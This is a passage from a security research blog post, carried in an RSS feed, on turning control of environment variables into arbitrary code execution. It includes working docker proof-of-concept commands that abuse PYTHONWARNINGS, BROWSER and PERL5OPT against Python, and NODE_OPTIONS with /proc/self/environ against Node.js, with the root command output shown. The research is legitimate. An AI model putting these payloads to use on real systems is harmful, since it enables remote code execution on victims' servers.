<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>

<h2 id="proof-of-concept-1">Proof of Concept</h2>

<figure>
  <figcaption>Figure-4: arbitrary code execution achieved using multiple environment variables against Python 2 and Python 3</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PYTHONWARNINGS=all:0:antigravity.x:0:0'</span> <span>-e</span> <span>'BROWSER=perlthanks'</span> <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit;'</span> python:2.7.18 python /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'

</span><span>$</span><span> </span>docker run <span>-e</span> <span>'PYTHONWARNINGS=all:0:antigravity.x:0:0'</span> <span>-e</span> <span>'BROWSER=perlthanks'</span> <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit;'</span> python:3.8.2 python /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'</span></code></pre></figure>

</figure>



<p>A <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">blog post</a> by <a href="https://twitter.com/securitymb">Michał Bentkowski</a> provided a payload for exploiting Kibana (CVE-2019-7609). A prototype pollution vulnerability was used to set arbitrary environment variables which resulted in arbitrary command execution. Michał’s payload used the <code>NODE_OPTIONS</code> environment variable and the <a href="https://en.wikipedia.org/wiki/Procfs">proc filesystem</a>, specifically <code>/proc/self/environ</code>.</p>

<p>Although Michał’s technique was creative and worked perfectly for their vulnerability, the technique is not always guaranteed to work and has some constraints that would be nice to remove.</p>

<p>The first constraint is that it using <code>/proc/self/environ</code> is only viable if the contents can be made to be syntactically valid JavaScript. This requires being able to create an environment variable and have it appear first in the contents of <code>/proc/self/environ</code>, or knowing/bruteforcing the environment variable’s name that will appear first and overwriting it’s value.</p>

<p>Another constraint, as the first environment variable’s value finishes with a single line comment (<code>//</code>). Therefore, any newline character in other environment variables will likely cause a syntax error and prevent the payload from executing. The use of multi-line comments (<code>/*</code>) will not fix this issue as they must be closed to be syntactically valid. Therefore, in the rare case that an environment variable contains a newline character, it is required to know/bruteforce the environment variable’s name and overwrite it’s value to a new value that does not contain a newline.</p>

<p>Removing these contraints is an exercise left for the reader.</p>

<h2 id="proof-of-concept-2">Proof of Concept</h2>

<figure>
  <figcaption>Figure-5: achieving arbitrary code execution with environment variables against NodeJS by Michał Bentkowski</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'NODE_VERSION=console.log(require("child_process").execSync("id").toString());//'</span> <span>-e</span> <span>'NODE_OPTIONS=--require /proc/self/environ'</span> node:14.2.0 node /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>



<p>If you run <code>ltrace -e getenv php /dev/null</code> you will find PHP uses the <code>PHPRC</code> environment variable.
The environment variable is used …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elttam.com/blog/env/">https://www.elttam.com/blog/env/</a></em></p>]]>
            </description>
            <link>https://www.elttam.com/blog/env/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23827486</guid>
            <pubDate>Tue, 14 Jul 2020 01:07:25 GMT</pubDate>
        </item>
    </channel>
</rss>
